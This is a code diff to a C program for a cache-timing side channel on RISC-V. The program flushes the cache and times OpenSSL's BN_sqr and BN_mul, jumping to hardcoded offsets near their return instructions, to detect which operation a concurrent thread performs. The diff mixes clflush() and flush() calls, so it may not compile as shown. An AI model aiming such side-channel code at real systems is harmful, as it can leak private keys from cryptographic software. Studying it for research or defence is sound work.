@@ -9,6 +9,8 @@
 
 #define SAMPLE_SIZE     20000
 #define RUNS            1000
+#define OFFSET_SQUARE   0xC2
+#define OFFSET_MULTIPLY 0x56
 
 typedef struct {
     uint64_t start;
@@ -38,22 +40,14 @@ static inline void flush()
     asm volatile("fence" ::: "memory");
 }
 
-// measure the time it takes to execute function p(0) and return start and duration
-static inline sample_t timed_call_1(int (*p)(BIGNUM*, const BIGNUM*, BN_CTX*), BIGNUM* r, const BIGNUM* a, BN_CTX* ctx)
+// measure the time it takes to execute function p and return start and duration
+// p is the function
+// offset is the offset from p to the ret instructions to reduce latency
+static inline sample_t timed_call(void* p, uint64_t offset)
 {
     uint64_t start, end;
     start = rdtsc();
-    p(r, a, ctx);
-    end = rdtsc();
-    return (sample_t) {start, end - start};
-}
-
-// measure the time it takes to execute function p(0,0) and return start and duration
-static inline sample_t timed_call_2(int (*p)(BIGNUM*, const BIGNUM*, const BIGNUM*, BN_CTX*), BIGNUM* r, const BIGNUM* a, const BIGNUM* b, BN_CTX* ctx)
-{
-    uint64_t start, end;
-    start = rdtsc();
-    p(r, a, b, ctx);
+    asm volatile("mv a5, %0; jalr a5\n" : : "r"(p + offset) :"a5","memory");
     end = rdtsc();
     return (sample_t) {start, end - start};
 }
@@ -72,9 +66,9 @@ void* calculate(void* d)
     size_t* done = (size_t*)d;
     for (size_t i=0; i<10; i++) {
         usleep(1000);
-        BN_sqr(&r, &a, ctx);
-        usleep(1000);
         BN_mul(&r, &a, &b, ctx);
+        usleep(1000);
+        BN_sqr(&r, &a, ctx); 
     }
     usleep(1000);
     // free the BN_CTX
@@ -180,11 +174,13 @@ int main()
     BN_sqr(&r, &a, ctx);
 
     for (size_t i=0; i<SAMPLE_SIZE; i++) {
-        chached_timings_1[i] = timed_call_1(BN_sqr, &r, &a, ctx).duration;
+        // chached_timings_1[i] = timed_call_1(BN_sqr, &r, &a, ctx).duration;
+        chached_timings_1[i] = timed_call(BN_sqr, OFFSET_SQUARE).duration;
     }
     for (size_t i=0; i<SAMPLE_SIZE; i++) {
-        flush();
-        unchached_timings_1[i] = timed_call_1(BN_sqr, &r, &a, ctx).duration;
+        clflush();
+        // unchached_timings_1[i] = timed_call_1(BN_sqr, &r, &a, ctx).duration;
+        unchached_timings_1[i] = timed_call(BN_sqr, OFFSET_SQUARE).duration;
     }
     uint64_t cached_median_1 = median(chached_timings_1, SAMPLE_SIZE);
     printf("cached median: %lu\n", cached_median_1);
@@ -197,12 +193,12 @@ int main()
     BN_mul(&r, &a, &b, ctx);
     for (int i = 0; i < SAMPLE_SIZE; i++)
     {
-        chached_timings_2[i] = timed_call_2(BN_mul, &r, &a, &b, ctx).duration;
+        chached_timings_2[i] = timed_call(BN_mul, OFFSET_MULTIPLY).duration;
     }
     for (int i = 0; i < SAMPLE_SIZE; i++)
     {
-        flush();
-        unchached_timings_2[i] = timed_call_2(BN_mul, &r, &a, &b, ctx).duration;
+        clflush();
+        unchached_timings_2[i] = timed_call(BN_mul,OFFSET_MULTIPLY).duration;
     }
     uint64_t cached_median_2 = median(chached_timings_2, SAMPLE_SIZE);
     printf("cached median: %lu\n", cached_median_2);
@@ -233,7 +229,7 @@ int main()
 
         while(td.done == 0)
         {   
-            sample_t sq_timing = timed_call_1(BN_sqr, &r, &a, ctx);
+            sample_t sq_timing = timed_call(BN_sqr, OFFSET_SQUARE);
             // flush after call to reduce chance of access between measurement and flush
             flush();
             if (sq_timing.duration < threshold_1)
@@ -263,7 +259,7 @@ int main()
 
         while(td.done == 0)
         {   
-            sample_t mul_timing = timed_call_2(BN_mul, &r, &a, &b, ctx);
+            sample_t mul_timing = timed_call(BN_mul, OFFSET_MULTIPLY);
             // flush after call to reduce chance of access between measurement and flush
             flush();
             if (mul_timing.duration < threshold_2)
